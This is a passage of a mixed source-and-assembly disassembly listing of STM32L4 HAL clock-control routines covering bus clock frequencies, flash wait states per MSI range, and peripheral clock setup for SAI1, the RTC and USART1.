 8004626:	bf00      	nop
 8004628:	40021000 	.word	0x40021000
 800462c:	0800d48c 	.word	0x0800d48c
 8004630:	00f42400 	.word	0x00f42400
 8004634:	007a1200 	.word	0x007a1200

08004638 <HAL_RCC_GetHCLKFreq>:
  *
  * @note   The SystemCoreClock CMSIS variable is used to store System Clock Frequency.
  * @retval HCLK frequency in Hz
  */
uint32_t HAL_RCC_GetHCLKFreq(void)
{
 8004638:	b480      	push	{r7}
 800463a:	af00      	add	r7, sp, #0
  return SystemCoreClock;
 800463c:	4b03      	ldr	r3, [pc, #12]	; (800464c <HAL_RCC_GetHCLKFreq+0x14>)
 800463e:	681b      	ldr	r3, [r3, #0]
}
 8004640:	4618      	mov	r0, r3
 8004642:	46bd      	mov	sp, r7
 8004644:	f85d 7b04 	ldr.w	r7, [sp], #4
 8004648:	4770      	bx	lr
 800464a:	bf00      	nop
 800464c:	20000000 	.word	0x20000000

08004650 <HAL_RCC_GetPCLK1Freq>:
  * @note   Each time PCLK1 changes, this function must be called to update the
  *         right PCLK1 value. Otherwise, any configuration based on this function will be incorrect.
  * @retval PCLK1 frequency in Hz
  */
uint32_t HAL_RCC_GetPCLK1Freq(void)
{
 8004650:	b580      	push	{r7, lr}
 8004652:	af00      	add	r7, sp, #0
  /* Get HCLK source and Compute PCLK1 frequency ---------------------------*/
  return (HAL_RCC_GetHCLKFreq() >> (APBPrescTable[READ_BIT(RCC->CFGR, RCC_CFGR_PPRE1) >> RCC_CFGR_PPRE1_Pos] & 0x1FU));
 8004654:	f7ff fff0 	bl	8004638 <HAL_RCC_GetHCLKFreq>
 8004658:	4602      	mov	r2, r0
 800465a:	4b06      	ldr	r3, [pc, #24]	; (8004674 <HAL_RCC_GetPCLK1Freq+0x24>)
 800465c:	689b      	ldr	r3, [r3, #8]
 800465e:	0a1b      	lsrs	r3, r3, #8
 8004660:	f003 0307 	and.w	r3, r3, #7
 8004664:	4904      	ldr	r1, [pc, #16]	; (8004678 <HAL_RCC_GetPCLK1Freq+0x28>)
 8004666:	5ccb      	ldrb	r3, [r1, r3]
 8004668:	f003 031f 	and.w	r3, r3, #31
 800466c:	fa22 f303 	lsr.w	r3, r2, r3
}
 8004670:	4618      	mov	r0, r3
 8004672:	bd80      	pop	{r7, pc}
 8004674:	40021000 	.word	0x40021000
 8004678:	0800d484 	.word	0x0800d484

0800467c <HAL_RCC_GetPCLK2Freq>:
  * @note   Each time PCLK2 changes, this function must be called to update the
  *         right PCLK2 value. Otherwise, any configuration based on this function will be incorrect.
  * @retval PCLK2 frequency in Hz
  */
uint32_t HAL_RCC_GetPCLK2Freq(void)
{
 800467c:	b580      	push	{r7, lr}
 800467e:	af00      	add	r7, sp, #0
  /* Get HCLK source and Compute PCLK2 frequency ---------------------------*/
  return (HAL_RCC_GetHCLKFreq()>> (APBPrescTable[READ_BIT(RCC->CFGR, RCC_CFGR_PPRE2) >> RCC_CFGR_PPRE2_Pos] & 0x1FU));
 8004680:	f7ff ffda 	bl	8004638 <HAL_RCC_GetHCLKFreq>
 8004684:	4602      	mov	r2, r0
 8004686:	4b06      	ldr	r3, [pc, #24]	; (80046a0 <HAL_RCC_GetPCLK2Freq+0x24>)
 8004688:	689b      	ldr	r3, [r3, #8]
 800468a:	0adb      	lsrs	r3, r3, #11
 800468c:	f003 0307 	and.w	r3, r3, #7
 8004690:	4904      	ldr	r1, [pc, #16]	; (80046a4 <HAL_RCC_GetPCLK2Freq+0x28>)
 8004692:	5ccb      	ldrb	r3, [r1, r3]
 8004694:	f003 031f 	and.w	r3, r3, #31
 8004698:	fa22 f303 	lsr.w	r3, r2, r3
}
 800469c:	4618      	mov	r0, r3
 800469e:	bd80      	pop	{r7, pc}
 80046a0:	40021000 	.word	0x40021000
 80046a4:	0800d484 	.word	0x0800d484

080046a8 <RCC_SetFlashLatencyFromMSIRange>:
            voltage range.
  * @param  msirange  MSI range value from RCC_MSIRANGE_0 to RCC_MSIRANGE_11
  * @retval HAL status
  */
static HAL_StatusTypeDef RCC_SetFlashLatencyFromMSIRange(uint32_t msirange)
{
 80046a8:	b580      	push	{r7, lr}
 80046aa:	b086      	sub	sp, #24
 80046ac:	af00      	add	r7, sp, #0
 80046ae:	6078      	str	r0, [r7, #4]
  uint32_t vos;
  uint32_t latency = FLASH_LATENCY_0;  /* default value 0WS */
 80046b0:	2300      	movs	r3, #0
 80046b2:	613b      	str	r3, [r7, #16]

  if(__HAL_RCC_PWR_IS_CLK_ENABLED())
 80046b4:	4b2a      	ldr	r3, [pc, #168]	; (8004760 <RCC_SetFlashLatencyFromMSIRange+0xb8>)
 80046b6:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 80046b8:	f003 5380 	and.w	r3, r3, #268435456	; 0x10000000
 80046bc:	2b00      	cmp	r3, #0
 80046be:	d003      	beq.n	80046c8 <RCC_SetFlashLatencyFromMSIRange+0x20>
  {
    vos = HAL_PWREx_GetVoltageRange();
 80046c0:	f7ff f9a6 	bl	8003a10 <HAL_PWREx_GetVoltageRange>
 80046c4:	6178      	str	r0, [r7, #20]
 80046c6:	e014      	b.n	80046f2 <RCC_SetFlashLatencyFromMSIRange+0x4a>
  }
  else
  {
    __HAL_RCC_PWR_CLK_ENABLE();
 80046c8:	4b25      	ldr	r3, [pc, #148]	; (8004760 <RCC_SetFlashLatencyFromMSIRange+0xb8>)
 80046ca:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 80046cc:	4a24      	ldr	r2, [pc, #144]	; (8004760 <RCC_SetFlashLatencyFromMSIRange+0xb8>)
 80046ce:	f043 5380 	orr.w	r3, r3, #268435456	; 0x10000000
 80046d2:	6593      	str	r3, [r2, #88]	; 0x58
 80046d4:	4b22      	ldr	r3, [pc, #136]	; (8004760 <RCC_SetFlashLatencyFromMSIRange+0xb8>)
 80046d6:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 80046d8:	f003 5380 	and.w	r3, r3, #268435456	; 0x10000000
 80046dc:	60fb      	str	r3, [r7, #12]
 80046de:	68fb      	ldr	r3, [r7, #12]
    vos = HAL_PWREx_GetVoltageRange();
 80046e0:	f7ff f996 	bl	8003a10 <HAL_PWREx_GetVoltageRange>
 80046e4:	6178      	str	r0, [r7, #20]
    __HAL_RCC_PWR_CLK_DISABLE();
 80046e6:	4b1e      	ldr	r3, [pc, #120]	; (8004760 <RCC_SetFlashLatencyFromMSIRange+0xb8>)
 80046e8:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 80046ea:	4a1d      	ldr	r2, [pc, #116]	; (8004760 <RCC_SetFlashLatencyFromMSIRange+0xb8>)
 80046ec:	f023 5380 	bic.w	r3, r3, #268435456	; 0x10000000
 80046f0:	6593      	str	r3, [r2, #88]	; 0x58
  }

  if(vos == PWR_REGULATOR_VOLTAGE_SCALE1)
 80046f2:	697b      	ldr	r3, [r7, #20]
 80046f4:	f5b3 7f00 	cmp.w	r3, #512	; 0x200
 80046f8:	d10b      	bne.n	8004712 <RCC_SetFlashLatencyFromMSIRange+0x6a>
  {
    if(msirange > RCC_MSIRANGE_8)
 80046fa:	687b      	ldr	r3, [r7, #4]
 80046fc:	2b80      	cmp	r3, #128	; 0x80
 80046fe:	d919      	bls.n	8004734 <RCC_SetFlashLatencyFromMSIRange+0x8c>
    {
      /* MSI > 16Mhz */
      if(msirange > RCC_MSIRANGE_10)
 8004700:	687b      	ldr	r3, [r7, #4]
 8004702:	2ba0      	cmp	r3, #160	; 0xa0
 8004704:	d902      	bls.n	800470c <RCC_SetFlashLatencyFromMSIRange+0x64>
      {
        /* MSI 48Mhz */
        latency = FLASH_LATENCY_2; /* 2WS */
 8004706:	2302      	movs	r3, #2
 8004708:	613b      	str	r3, [r7, #16]
 800470a:	e013      	b.n	8004734 <RCC_SetFlashLatencyFromMSIRange+0x8c>
      }
      else
      {
        /* MSI 24Mhz or 32Mhz */
        latency = FLASH_LATENCY_1; /* 1WS */
 800470c:	2301      	movs	r3, #1
 800470e:	613b      	str	r3, [r7, #16]
 8004710:	e010      	b.n	8004734 <RCC_SetFlashLatencyFromMSIRange+0x8c>
        latency = FLASH_LATENCY_1; /* 1WS */
      }
      /* else MSI < 8Mhz default FLASH_LATENCY_0 0WS */
    }
#else
    if(msirange > RCC_MSIRANGE_8)
 8004712:	687b      	ldr	r3, [r7, #4]
 8004714:	2b80      	cmp	r3, #128	; 0x80
 8004716:	d902      	bls.n	800471e <RCC_SetFlashLatencyFromMSIRange+0x76>
    {
      /* MSI > 16Mhz */
      latency = FLASH_LATENCY_3; /* 3WS */
 8004718:	2303      	movs	r3, #3
 800471a:	613b      	str	r3, [r7, #16]
 800471c:	e00a      	b.n	8004734 <RCC_SetFlashLatencyFromMSIRange+0x8c>
    }
    else
    {
      if(msirange == RCC_MSIRANGE_8)
 800471e:	687b      	ldr	r3, [r7, #4]
 8004720:	2b80      	cmp	r3, #128	; 0x80
 8004722:	d102      	bne.n	800472a <RCC_SetFlashLatencyFromMSIRange+0x82>
      {
        /* MSI 16Mhz */
        latency = FLASH_LATENCY_2; /* 2WS */
 8004724:	2302      	movs	r3, #2
 8004726:	613b      	str	r3, [r7, #16]
 8004728:	e004      	b.n	8004734 <RCC_SetFlashLatencyFromMSIRange+0x8c>
      }
      else if(msirange == RCC_MSIRANGE_7)
 800472a:	687b      	ldr	r3, [r7, #4]
 800472c:	2b70      	cmp	r3, #112	; 0x70
 800472e:	d101      	bne.n	8004734 <RCC_SetFlashLatencyFromMSIRange+0x8c>
      {
        /* MSI 8Mhz */
        latency = FLASH_LATENCY_1; /* 1WS */
 8004730:	2301      	movs	r3, #1
 8004732:	613b      	str	r3, [r7, #16]
      /* else MSI < 8Mhz default FLASH_LATENCY_0 0WS */
    }
#endif
  }

  __HAL_FLASH_SET_LATENCY(latency);
 8004734:	4b0b      	ldr	r3, [pc, #44]	; (8004764 <RCC_SetFlashLatencyFromMSIRange+0xbc>)
 8004736:	681b      	ldr	r3, [r3, #0]
 8004738:	f023 0207 	bic.w	r2, r3, #7
 800473c:	4909      	ldr	r1, [pc, #36]	; (8004764 <RCC_SetFlashLatencyFromMSIRange+0xbc>)
 800473e:	693b      	ldr	r3, [r7, #16]
 8004740:	4313      	orrs	r3, r2
 8004742:	600b      	str	r3, [r1, #0]

  /* Check that the new number of wait states is taken into account to access the Flash
     memory by reading the FLASH_ACR register */
  if(__HAL_FLASH_GET_LATENCY() != latency)
 8004744:	4b07      	ldr	r3, [pc, #28]	; (8004764 <RCC_SetFlashLatencyFromMSIRange+0xbc>)
 8004746:	681b      	ldr	r3, [r3, #0]
 8004748:	f003 0307 	and.w	r3, r3, #7
 800474c:	693a      	ldr	r2, [r7, #16]
 800474e:	429a      	cmp	r2, r3
 8004750:	d001      	beq.n	8004756 <RCC_SetFlashLatencyFromMSIRange+0xae>
  {
    return HAL_ERROR;
 8004752:	2301      	movs	r3, #1
 8004754:	e000      	b.n	8004758 <RCC_SetFlashLatencyFromMSIRange+0xb0>
  }

  return HAL_OK;
 8004756:	2300      	movs	r3, #0
}
 8004758:	4618      	mov	r0, r3
 800475a:	3718      	adds	r7, #24
 800475c:	46bd      	mov	sp, r7
 800475e:	bd80      	pop	{r7, pc}
 8004760:	40021000 	.word	0x40021000
 8004764:	40022000 	.word	0x40022000

08004768 <HAL_RCCEx_PeriphCLKConfig>:
  *         the RTC clock source: in this case the access to Backup domain is enabled.
  *
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_RCCEx_PeriphCLKConfig(RCC_PeriphCLKInitTypeDef  *PeriphClkInit)
{
 8004768:	b580      	push	{r7, lr}
 800476a:	b086      	sub	sp, #24
 800476c:	af00      	add	r7, sp, #0
 800476e:	6078      	str	r0, [r7, #4]
  uint32_t tmpregister, tickstart;     /* no init needed */
  HAL_StatusTypeDef ret = HAL_OK;      /* Intermediate status */
 8004770:	2300      	movs	r3, #0
 8004772:	74fb      	strb	r3, [r7, #19]
  HAL_StatusTypeDef status = HAL_OK;   /* Final status */
 8004774:	2300      	movs	r3, #0
 8004776:	74bb      	strb	r3, [r7, #18]
  assert_param(IS_RCC_PERIPHCLOCK(PeriphClkInit->PeriphClockSelection));

#if defined(SAI1)

  /*-------------------------- SAI1 clock source configuration ---------------------*/
  if((((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_SAI1) == RCC_PERIPHCLK_SAI1))
 8004778:	687b      	ldr	r3, [r7, #4]
 800477a:	681b      	ldr	r3, [r3, #0]
 800477c:	f403 6300 	and.w	r3, r3, #2048	; 0x800
 8004780:	2b00      	cmp	r3, #0
 8004782:	d031      	beq.n	80047e8 <HAL_RCCEx_PeriphCLKConfig+0x80>
  {
    /* Check the parameters */
    assert_param(IS_RCC_SAI1CLK(PeriphClkInit->Sai1ClockSelection));

    switch(PeriphClkInit->Sai1ClockSelection)
 8004784:	687b      	ldr	r3, [r7, #4]
 8004786:	6bdb      	ldr	r3, [r3, #60]	; 0x3c
 8004788:	f5b3 0f40 	cmp.w	r3, #12582912	; 0xc00000
 800478c:	d01a      	beq.n	80047c4 <HAL_RCCEx_PeriphCLKConfig+0x5c>
 800478e:	f5b3 0f40 	cmp.w	r3, #12582912	; 0xc00000
 8004792:	d814      	bhi.n	80047be <HAL_RCCEx_PeriphCLKConfig+0x56>
 8004794:	2b00      	cmp	r3, #0
 8004796:	d009      	beq.n	80047ac <HAL_RCCEx_PeriphCLKConfig+0x44>
 8004798:	f5b3 0f00 	cmp.w	r3, #8388608	; 0x800000
 800479c:	d10f      	bne.n	80047be <HAL_RCCEx_PeriphCLKConfig+0x56>
    case RCC_SAI1CLKSOURCE_PLL:      /* PLL is used as clock source for SAI1*/
      /* Enable SAI Clock output generated from System PLL . */
#if defined(RCC_PLLSAI2_SUPPORT)
      __HAL_RCC_PLLCLKOUT_ENABLE(RCC_PLL_SAI3CLK);
#else
      __HAL_RCC_PLLCLKOUT_ENABLE(RCC_PLL_SAI2CLK);
 800479e:	4b5d      	ldr	r3, [pc, #372]	; (8004914 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 80047a0:	68db      	ldr	r3, [r3, #12]
 80047a2:	4a5c      	ldr	r2, [pc, #368]	; (8004914 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 80047a4:	f443 3380 	orr.w	r3, r3, #65536	; 0x10000
 80047a8:	60d3      	str	r3, [r2, #12]
#endif /* RCC_PLLSAI2_SUPPORT */
      /* SAI1 clock source config set later after clock selection check */
      break;
 80047aa:	e00c      	b.n	80047c6 <HAL_RCCEx_PeriphCLKConfig+0x5e>

    case RCC_SAI1CLKSOURCE_PLLSAI1:  /* PLLSAI1 is used as clock source for SAI1*/
      /* PLLSAI1 input clock, parameters M, N & P configuration and clock output (PLLSAI1ClockOut) */
      ret = RCCEx_PLLSAI1_Config(&(PeriphClkInit->PLLSAI1), DIVIDER_P_UPDATE);
 80047ac:	687b      	ldr	r3, [r7, #4]
 80047ae:	3304      	adds	r3, #4
 80047b0:	2100      	movs	r1, #0
 80047b2:	4618      	mov	r0, r3
 80047b4:	f000 f9de 	bl	8004b74 <RCCEx_PLLSAI1_Config>
 80047b8:	4603      	mov	r3, r0
 80047ba:	74fb      	strb	r3, [r7, #19]
      /* SAI1 clock source config set later after clock selection check */
      break;
 80047bc:	e003      	b.n	80047c6 <HAL_RCCEx_PeriphCLKConfig+0x5e>
#endif /* STM32L4P5xx || STM32L4Q5xx || STM32L4R5xx || STM32L4R7xx || STM32L4R9xx || STM32L4S5xx || STM32L4S7xx || STM32L4S9xx */
      /* SAI1 clock source config set later after clock selection check */
      break;

    default:
      ret = HAL_ERROR;
 80047be:	2301      	movs	r3, #1
 80047c0:	74fb      	strb	r3, [r7, #19]
      break;
 80047c2:	e000      	b.n	80047c6 <HAL_RCCEx_PeriphCLKConfig+0x5e>
      break;
 80047c4:	bf00      	nop
    }

    if(ret == HAL_OK)
 80047c6:	7cfb      	ldrb	r3, [r7, #19]
 80047c8:	2b00      	cmp	r3, #0
 80047ca:	d10b      	bne.n	80047e4 <HAL_RCCEx_PeriphCLKConfig+0x7c>
    {
      /* Set the source of SAI1 clock*/
      __HAL_RCC_SAI1_CONFIG(PeriphClkInit->Sai1ClockSelection);
 80047cc:	4b51      	ldr	r3, [pc, #324]	; (8004914 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 80047ce:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 80047d2:	f423 0240 	bic.w	r2, r3, #12582912	; 0xc00000
 80047d6:	687b      	ldr	r3, [r7, #4]
 80047d8:	6bdb      	ldr	r3, [r3, #60]	; 0x3c
 80047da:	494e      	ldr	r1, [pc, #312]	; (8004914 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 80047dc:	4313      	orrs	r3, r2
 80047de:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
 80047e2:	e001      	b.n	80047e8 <HAL_RCCEx_PeriphCLKConfig+0x80>
    }
    else
    {
      /* set overall return value */
      status = ret;
 80047e4:	7cfb      	ldrb	r3, [r7, #19]
 80047e6:	74bb      	strb	r3, [r7, #18]
    }
  }
#endif /* SAI2 */

  /*-------------------------- RTC clock source configuration ----------------------*/
  if((PeriphClkInit->PeriphClockSelection & RCC_PERIPHCLK_RTC) == RCC_PERIPHCLK_RTC)
 80047e8:	687b      	ldr	r3, [r7, #4]
 80047ea:	681b      	ldr	r3, [r3, #0]
 80047ec:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
 80047f0:	2b00      	cmp	r3, #0
 80047f2:	f000 809e 	beq.w	8004932 <HAL_RCCEx_PeriphCLKConfig+0x1ca>
  {
    FlagStatus       pwrclkchanged = RESET;
 80047f6:	2300      	movs	r3, #0
 80047f8:	747b      	strb	r3, [r7, #17]

    /* Check for RTC Parameters used to output RTCCLK */
    assert_param(IS_RCC_RTCCLKSOURCE(PeriphClkInit->RTCClockSelection));

    /* Enable Power Clock */
    if(__HAL_RCC_PWR_IS_CLK_DISABLED() != 0U)
 80047fa:	4b46      	ldr	r3, [pc, #280]	; (8004914 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 80047fc:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 80047fe:	f003 5380 	and.w	r3, r3, #268435456	; 0x10000000
 8004802:	2b00      	cmp	r3, #0
 8004804:	d101      	bne.n	800480a <HAL_RCCEx_PeriphCLKConfig+0xa2>
 8004806:	2301      	movs	r3, #1
 8004808:	e000      	b.n	800480c <HAL_RCCEx_PeriphCLKConfig+0xa4>
 800480a:	2300      	movs	r3, #0
 800480c:	2b00      	cmp	r3, #0
 800480e:	d00d      	beq.n	800482c <HAL_RCCEx_PeriphCLKConfig+0xc4>
    {
      __HAL_RCC_PWR_CLK_ENABLE();
 8004810:	4b40      	ldr	r3, [pc, #256]	; (8004914 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 8004812:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8004814:	4a3f      	ldr	r2, [pc, #252]	; (8004914 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 8004816:	f043 5380 	orr.w	r3, r3, #268435456	; 0x10000000
 800481a:	6593      	str	r3, [r2, #88]	; 0x58
 800481c:	4b3d      	ldr	r3, [pc, #244]	; (8004914 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 800481e:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8004820:	f003 5380 	and.w	r3, r3, #268435456	; 0x10000000
 8004824:	60bb      	str	r3, [r7, #8]
 8004826:	68bb      	ldr	r3, [r7, #8]
      pwrclkchanged = SET;
 8004828:	2301      	movs	r3, #1
 800482a:	747b      	strb	r3, [r7, #17]
    }

    /* Enable write access to Backup domain */
    SET_BIT(PWR->CR1, PWR_CR1_DBP);
 800482c:	4b3a      	ldr	r3, [pc, #232]	; (8004918 <HAL_RCCEx_PeriphCLKConfig+0x1b0>)
 800482e:	681b      	ldr	r3, [r3, #0]
 8004830:	4a39      	ldr	r2, [pc, #228]	; (8004918 <HAL_RCCEx_PeriphCLKConfig+0x1b0>)
 8004832:	f443 7380 	orr.w	r3, r3, #256	; 0x100
 8004836:	6013      	str	r3, [r2, #0]

    /* Wait for Backup domain Write protection disable */
    tickstart = HAL_GetTick();
 8004838:	f7fc fdda 	bl	80013f0 <HAL_GetTick>
 800483c:	60f8      	str	r0, [r7, #12]

    while(READ_BIT(PWR->CR1, PWR_CR1_DBP) == 0U)
 800483e:	e009      	b.n	8004854 <HAL_RCCEx_PeriphCLKConfig+0xec>
    {
      if((HAL_GetTick() - tickstart) > RCC_DBP_TIMEOUT_VALUE)
 8004840:	f7fc fdd6 	bl	80013f0 <HAL_GetTick>
 8004844:	4602      	mov	r2, r0
 8004846:	68fb      	ldr	r3, [r7, #12]
 8004848:	1ad3      	subs	r3, r2, r3
 800484a:	2b02      	cmp	r3, #2
 800484c:	d902      	bls.n	8004854 <HAL_RCCEx_PeriphCLKConfig+0xec>
      {
        ret = HAL_TIMEOUT;
 800484e:	2303      	movs	r3, #3
 8004850:	74fb      	strb	r3, [r7, #19]
        break;
 8004852:	e005      	b.n	8004860 <HAL_RCCEx_PeriphCLKConfig+0xf8>
    while(READ_BIT(PWR->CR1, PWR_CR1_DBP) == 0U)
 8004854:	4b30      	ldr	r3, [pc, #192]	; (8004918 <HAL_RCCEx_PeriphCLKConfig+0x1b0>)
 8004856:	681b      	ldr	r3, [r3, #0]
 8004858:	f403 7380 	and.w	r3, r3, #256	; 0x100
 800485c:	2b00      	cmp	r3, #0
 800485e:	d0ef      	beq.n	8004840 <HAL_RCCEx_PeriphCLKConfig+0xd8>
      }
    }

    if(ret == HAL_OK)
 8004860:	7cfb      	ldrb	r3, [r7, #19]
 8004862:	2b00      	cmp	r3, #0
 8004864:	d15a      	bne.n	800491c <HAL_RCCEx_PeriphCLKConfig+0x1b4>
    {
      /* Reset the Backup domain only if the RTC Clock source selection is modified from default */
      tmpregister = READ_BIT(RCC->BDCR, RCC_BDCR_RTCSEL);
 8004866:	4b2b      	ldr	r3, [pc, #172]	; (8004914 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 8004868:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 800486c:	f403 7340 	and.w	r3, r3, #768	; 0x300
 8004870:	617b      	str	r3, [r7, #20]

      if((tmpregister != RCC_RTCCLKSOURCE_NONE) && (tmpregister != PeriphClkInit->RTCClockSelection))
 8004872:	697b      	ldr	r3, [r7, #20]
 8004874:	2b00      	cmp	r3, #0
 8004876:	d01e      	beq.n	80048b6 <HAL_RCCEx_PeriphCLKConfig+0x14e>
 8004878:	687b      	ldr	r3, [r7, #4]
 800487a:	6d1b      	ldr	r3, [r3, #80]	; 0x50
 800487c:	697a      	ldr	r2, [r7, #20]
 800487e:	429a      	cmp	r2, r3
 8004880:	d019      	beq.n	80048b6 <HAL_RCCEx_PeriphCLKConfig+0x14e>
      {
        /* Store the content of BDCR register before the reset of Backup Domain */
        tmpregister = READ_BIT(RCC->BDCR, ~(RCC_BDCR_RTCSEL));
 8004882:	4b24      	ldr	r3, [pc, #144]	; (8004914 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 8004884:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8004888:	f423 7340 	bic.w	r3, r3, #768	; 0x300
 800488c:	617b      	str	r3, [r7, #20]
        /* RTC Clock selection can be changed only if the Backup Domain is reset */
        __HAL_RCC_BACKUPRESET_FORCE();
 800488e:	4b21      	ldr	r3, [pc, #132]	; (8004914 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 8004890:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8004894:	4a1f      	ldr	r2, [pc, #124]	; (8004914 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 8004896:	f443 3380 	orr.w	r3, r3, #65536	; 0x10000
 800489a:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
        __HAL_RCC_BACKUPRESET_RELEASE();
 800489e:	4b1d      	ldr	r3, [pc, #116]	; (8004914 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 80048a0:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 80048a4:	4a1b      	ldr	r2, [pc, #108]	; (8004914 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 80048a6:	f423 3380 	bic.w	r3, r3, #65536	; 0x10000
 80048aa:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
        /* Restore the Content of BDCR register */
        RCC->BDCR = tmpregister;
 80048ae:	4a19      	ldr	r2, [pc, #100]	; (8004914 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 80048b0:	697b      	ldr	r3, [r7, #20]
 80048b2:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
      }

      /* Wait for LSE reactivation if LSE was enable prior to Backup Domain reset */
      if (HAL_IS_BIT_SET(tmpregister, RCC_BDCR_LSEON))
 80048b6:	697b      	ldr	r3, [r7, #20]
 80048b8:	f003 0301 	and.w	r3, r3, #1
 80048bc:	2b00      	cmp	r3, #0
 80048be:	d016      	beq.n	80048ee <HAL_RCCEx_PeriphCLKConfig+0x186>
      {
        /* Get Start Tick*/
        tickstart = HAL_GetTick();
 80048c0:	f7fc fd96 	bl	80013f0 <HAL_GetTick>
 80048c4:	60f8      	str	r0, [r7, #12]

        /* Wait till LSE is ready */
        while(READ_BIT(RCC->BDCR, RCC_BDCR_LSERDY) == 0U)
 80048c6:	e00b      	b.n	80048e0 <HAL_RCCEx_PeriphCLKConfig+0x178>
        {
          if((HAL_GetTick() - tickstart) > RCC_LSE_TIMEOUT_VALUE)
 80048c8:	f7fc fd92 	bl	80013f0 <HAL_GetTick>
 80048cc:	4602      	mov	r2, r0
 80048ce:	68fb      	ldr	r3, [r7, #12]
 80048d0:	1ad3      	subs	r3, r2, r3
 80048d2:	f241 3288 	movw	r2, #5000	; 0x1388
 80048d6:	4293      	cmp	r3, r2
 80048d8:	d902      	bls.n	80048e0 <HAL_RCCEx_PeriphCLKConfig+0x178>
          {
            ret = HAL_TIMEOUT;
 80048da:	2303      	movs	r3, #3
 80048dc:	74fb      	strb	r3, [r7, #19]
            break;
 80048de:	e006      	b.n	80048ee <HAL_RCCEx_PeriphCLKConfig+0x186>
        while(READ_BIT(RCC->BDCR, RCC_BDCR_LSERDY) == 0U)
 80048e0:	4b0c      	ldr	r3, [pc, #48]	; (8004914 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 80048e2:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 80048e6:	f003 0302 	and.w	r3, r3, #2
 80048ea:	2b00      	cmp	r3, #0
 80048ec:	d0ec      	beq.n	80048c8 <HAL_RCCEx_PeriphCLKConfig+0x160>
          }
        }
      }

      if(ret == HAL_OK)
 80048ee:	7cfb      	ldrb	r3, [r7, #19]
 80048f0:	2b00      	cmp	r3, #0
 80048f2:	d10b      	bne.n	800490c <HAL_RCCEx_PeriphCLKConfig+0x1a4>
      {
        /* Apply new RTC clock source selection */
        __HAL_RCC_RTC_CONFIG(PeriphClkInit->RTCClockSelection);
 80048f4:	4b07      	ldr	r3, [pc, #28]	; (8004914 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 80048f6:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 80048fa:	f423 7240 	bic.w	r2, r3, #768	; 0x300
 80048fe:	687b      	ldr	r3, [r7, #4]
 8004900:	6d1b      	ldr	r3, [r3, #80]	; 0x50
 8004902:	4904      	ldr	r1, [pc, #16]	; (8004914 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 8004904:	4313      	orrs	r3, r2
 8004906:	f8c1 3090 	str.w	r3, [r1, #144]	; 0x90
 800490a:	e009      	b.n	8004920 <HAL_RCCEx_PeriphCLKConfig+0x1b8>
      }
      else
      {
        /* set overall return value */
        status = ret;
 800490c:	7cfb      	ldrb	r3, [r7, #19]
 800490e:	74bb      	strb	r3, [r7, #18]
 8004910:	e006      	b.n	8004920 <HAL_RCCEx_PeriphCLKConfig+0x1b8>
 8004912:	bf00      	nop
 8004914:	40021000 	.word	0x40021000
 8004918:	40007000 	.word	0x40007000
      }
    }
    else
    {
      /* set overall return value */
      status = ret;
 800491c:	7cfb      	ldrb	r3, [r7, #19]
 800491e:	74bb      	strb	r3, [r7, #18]
    }

    /* Restore clock configuration if changed */
    if(pwrclkchanged == SET)
 8004920:	7c7b      	ldrb	r3, [r7, #17]
 8004922:	2b01      	cmp	r3, #1
 8004924:	d105      	bne.n	8004932 <HAL_RCCEx_PeriphCLKConfig+0x1ca>
    {
      __HAL_RCC_PWR_CLK_DISABLE();
 8004926:	4b8a      	ldr	r3, [pc, #552]	; (8004b50 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004928:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 800492a:	4a89      	ldr	r2, [pc, #548]	; (8004b50 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 800492c:	f023 5380 	bic.w	r3, r3, #268435456	; 0x10000000
 8004930:	6593      	str	r3, [r2, #88]	; 0x58
    }
  }

  /*-------------------------- USART1 clock source configuration -------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_USART1) == RCC_PERIPHCLK_USART1)
 8004932:	687b      	ldr	r3, [r7, #4]
 8004934:	681b      	ldr	r3, [r3, #0]
 8004936:	f003 0301 	and.w	r3, r3, #1
 800493a:	2b00      	cmp	r3, #0
 800493c:	d00a      	beq.n	8004954 <HAL_RCCEx_PeriphCLKConfig+0x1ec>
  {
    /* Check the parameters */
    assert_param(IS_RCC_USART1CLKSOURCE(PeriphClkInit->Usart1ClockSelection));

    /* Configure the USART1 clock source */
